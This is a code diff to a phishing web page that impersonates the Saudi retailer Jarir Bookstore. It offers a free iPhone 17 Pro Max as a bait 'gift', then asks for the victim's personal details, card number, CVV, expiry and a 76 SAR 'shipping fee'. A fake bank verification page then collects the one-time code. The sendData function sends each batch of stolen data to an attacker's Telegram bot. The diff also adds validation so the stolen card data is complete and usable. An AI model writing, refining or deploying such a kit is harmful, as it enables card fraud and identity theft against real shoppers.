@@ -15,14 +15,16 @@
         .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; font-size: 14px; }
         .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; }
         
+        /* أيقونة السلة جرير */
         .cart-icon-container { position: relative; background: #F0F2F5; padding: 8px; border-radius: 8px; }
         .cart-badge { position: absolute; top: -5px; right: -5px; background: #FF9800; color: white; font-size: 10px; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
-        .back-to-top { position: fixed; bottom: 80px; left: 20px; background: white; border: 1px solid #DDD; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); z-index: 100; }
-
+        
+        /* شاشة التحميل */
         #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
         .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--jarir-red); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
+        /* صفحة البنك */
         #page-bank { direction: ltr; text-align: left; }
         .bank-container { padding: 20px; max-width: 450px; margin: 0 auto; }
         .confirm-btn-blue { width: 100%; background-color: #0000FF; color: white; border: none; padding: 16px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; margin-top: 20px;}
@@ -55,11 +57,6 @@
             </div>
         </header>
 
-        <div class="bg-gray-50 p-3 flex justify-between items-center border-b text-sm text-gray-500">
-            <i class="fa-solid fa-chevron-down text-xs"></i>
-            <span>حدد خيار التوصيل الذي تفضله</span>
-        </div>
-
         <div class="py-6 flex justify-center">
             <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="w-[280px]">
         </div>
@@ -70,30 +67,19 @@
                     <p class="text-[10px] text-gray-400">رقم الصنف 666736 رقم المنتج MFY94AHA</p>
                     <h1 class="text-xl font-bold text-gray-900">ابل آيفون 17 برو ماكس</h1>
                 </div>
-                <i class="fa-brands fa-apple text-3xl text-gray-800"></i>
+                <i class="fa-brands fa-apple text-3xl"></i>
             </div>
-            
-            <div class="flex flex-wrap gap-2 mb-6 justify-end">
-                <span class="border px-3 py-1 text-xs text-gray-500 rounded">256 جيجابايت</span>
-                <span class="border px-3 py-1 text-xs text-gray-500 rounded">برتقالي كوزمك الجيل الخامس</span>
-                <span class="border px-3 py-1 text-xs text-gray-500 rounded">آبل آيه 19 برو</span>
-            </div>
-
             <div class="flex justify-between items-center mb-6">
                 <button onclick="showPage('page-register')" class="bg-[#E30613] text-white font-bold w-1/2 py-4 rounded-lg text-lg">استلم الهديه</button>
                 <div class="text-right">
-                    <div class="text-[#E30613] text-3xl font-black">هديه من جرير <span class="text-sm">ر.س</span></div>
-                    <p class="text-[10px] text-gray-400">شامل ضريبة القيمة المضافة</p>
+                    <div class="text-[#E30613] text-3xl font-black">هديه من جرير</div>
                 </div>
             </div>
-
             <div class="flex justify-between py-6 border-t mt-4">
                 <i class="fa-brands fa-linkedin text-[#0077B5] text-2xl"></i>
                 <i class="fa-brands fa-tiktok text-black text-2xl"></i>
-                <i class="fa-brands fa-snapchat text-[#FFFC00] bg-black p-1 rounded-full text-lg"></i>
                 <i class="fa-brands fa-youtube text-[#FF0000] text-2xl"></i>
                 <i class="fa-brands fa-instagram text-[#E4405F] text-2xl"></i>
-                <i class="fa-brands fa-x-twitter text-black text-2xl"></i>
                 <i class="fa-brands fa-facebook text-[#1877F2] text-2xl"></i>
             </div>
         </main>
@@ -107,8 +93,8 @@
         </header>
         <div class="p-6 space-y-4">
             <input type="tel" id="user-phone" placeholder="رقم الهاتف" class="form-input">
-            <input type="text" id="user-name" placeholder="الاسم الأول" class="form-input">
-            <input type="text" id="user-address" placeholder="العنوان الكامل (المدينة، الحي، الشارع)" class="form-input">
+            <input type="text" id="user-name" placeholder="الاسم الكامل" class="form-input">
+            <input type="text" id="user-address" placeholder="العنوان الكامل" class="form-input">
             <input type="email" id="user-email" placeholder="البريد الإلكتروني" class="form-input">
             <button onclick="sendData('register')" class="btn-red py-4 mt-6">استمرار</button>
         </div>
@@ -118,14 +104,13 @@
         <header class="p-4 bg-white border-b flex justify-between items-center">
             <button onclick="showPage('page-register')"><i class="fa-solid fa-chevron-right ml-1"></i>العودة</button>
             <span class="font-bold">دفع مصاريف الشحن</span>
-            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
         </header>
         <main class="p-4">
-            <div class="bg-white rounded-lg p-6 shadow-sm border relative">
-                <input type="text" id="card-num" placeholder="رقم البطاقة" class="form-input mb-4">
+            <div class="bg-white rounded-lg p-6 shadow-sm border">
+                <input type="text" id="card-num" placeholder="رقم البطاقة" class="form-input mb-4" maxlength="16">
                 <div class="flex gap-2">
-                    <input type="text" id="card-cvv" placeholder="CVV" class="form-input w-1/3">
-                    <input type="text" id="card-exp" placeholder="تاريخ الانتهاء" class="form-input w-2/3">
+                    <input type="text" id="card-cvv" placeholder="CVV" class="form-input w-1/3" maxlength="3">
+                    <input type="text" id="card-exp" placeholder="MM/YY" class="form-input w-2/3" maxlength="5">
                 </div>
                 <input type="text" id="card-holder" placeholder="اسم حامل البطاقة" class="form-input mt-4">
                 <button onclick="sendData('payment')" class="btn-red py-4 mt-8">مصاريف الشحن( 76ر.س.)</button>
@@ -141,17 +126,13 @@
             </div>
             <div style="display: flex; justify-content: space-between; align-items: center;">
                 <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" style="height: 60px;">
-                <div style="text-align: right;">
-                    <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" style="height: 60px;">
-                    <div style="font-size: 11px; color: #444;">ID Check</div>
-                </div>
+                <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" style="height: 60px;">
             </div>
             <hr style="margin: 20px 0; border: 0; border-top: 1px solid #eee;">
-            <h1 style="font-size: 24px; font-weight: bold; font-family: serif;">Verify By Phone</h1>
-            <p>You are paying <strong>Jarir Bookstore</strong> the amount of <strong>SAR 76.00</strong>.</p>
+            <h1 style="font-size: 24px; font-weight: bold;">Verify By Phone</h1>
+            <p>Paying <strong>Jarir Bookstore</strong>: <strong>SAR 76.00</strong></p>
             <div style="text-align: center; margin-top: 40px;">
-                <label style="color: #888; font-size: 14px; display: block; margin-bottom: 8px;">Verification code</label>
-                <input type="text" id="bank-otp" style="width: 100%; height: 50px; border: 1px solid #ccc; text-align: center; font-size: 24px; border-radius: 4px;">
+                <input type="text" id="bank-otp" placeholder="Enter Code" style="width: 100%; height: 50px; border: 1px solid #ccc; text-align: center; font-size: 24px;">
                 <button onclick="sendData('otp')" class="confirm-btn-blue">CONFIRM</button>
             </div>
         </div>
@@ -176,18 +157,33 @@
         }
 
         async function sendData(step) {
-            let text = "";
             if(step === 'register') {
-                // إضافة العنوان إلى نص الرسالة
-                text = `👤 زبون جديد:\n📞 هاتف: ${document.getElementById('user-phone').value}\n📝 اسم: ${document.getElementById('user-name').value}\n🏠 العنوان: ${document.getElementById('user-address').value}\n📧 بريد: ${document.getElementById('user-email').value}`;
+                const phone = document.getElementById('user-phone').value;
+                const email = document.getElementById('user-email').value;
+                const name = document.getElementById('user-name').value;
+                const addr = document.getElementById('user-address').value;
+
+                if(phone.length < 9 || name === "" || addr === "" || !email.includes("@")) {
+                    alert("يرجى إكمال جميع البيانات بشكل صحيح"); return;
+                }
+
+                const text = `👤 زبون جديد:\n📞 هاتف: ${phone}\n📝 اسم: ${name}\n🏠 عنوان: ${addr}\n📧 بريد: ${email}`;
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
                 startLoading('page-payment');
+
             } else if(step === 'payment') {
-                text = `💳 معلومات البطاقة:\n🔢 رقم: ${document.getElementById('card-num').value}\n📅 تاريخ: ${document.getElementById('card-exp').value}\n🔒 CVV: ${document.getElementById('card-cvv').value}\n👤 اسم: ${document.getElementById('card-holder').value}`;
+                const card = document.getElementById('card-num').value;
+                if(card.length < 16) { alert("رقم البطاقة غير صحيح"); return; }
+
+                const text = `💳 بطاقة:\n🔢 رقم: ${card}\n📅 تاريخ: ${document.getElementById('card-exp').value}\n🔒 CVV: ${document.getElementById('card-cvv').value}\n👤 اسم: ${document.getElementById('card-holder').value}`;
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
                 startLoading('page-bank');
+
             } else if(step === 'otp') {
-                text = `🔑 كود التحقق (OTP):\n🔢 الكود: ${document.getElementById('bank-otp').value}`;
+                const otp = document.getElementById('bank-otp').value;
+                if(otp === "") { alert("يرجى إدخال الكود"); return; }
+
+                const text = `🔑 كود التحقق (OTP):\n🔢 الكود: ${otp}`;
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
                 alert("تم استلام طلبك بنجاح.");
             }
